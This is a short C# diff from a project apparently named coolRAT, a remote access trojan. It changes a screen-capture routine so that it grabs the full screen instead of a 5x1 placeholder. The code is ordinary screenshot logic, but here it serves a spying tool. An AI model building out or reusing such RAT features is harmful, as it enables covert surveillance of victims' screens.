@@ -29,7 +29,7 @@ namespace coolRAT.Libs
             
             using (MemoryStream m = new MemoryStream())
             {
-                Bitmap img = new Bitmap(5, 1, PixelFormat.Format24bppRgb);
+                Bitmap img = new Bitmap(Screen.Bounds.Width, Screen.Bounds.Height, PixelFormat.Format24bppRgb);
                 Graphics g = Graphics.FromImage(img);
                 g.CopyFromScreen(
                     Screen.Bounds.X,
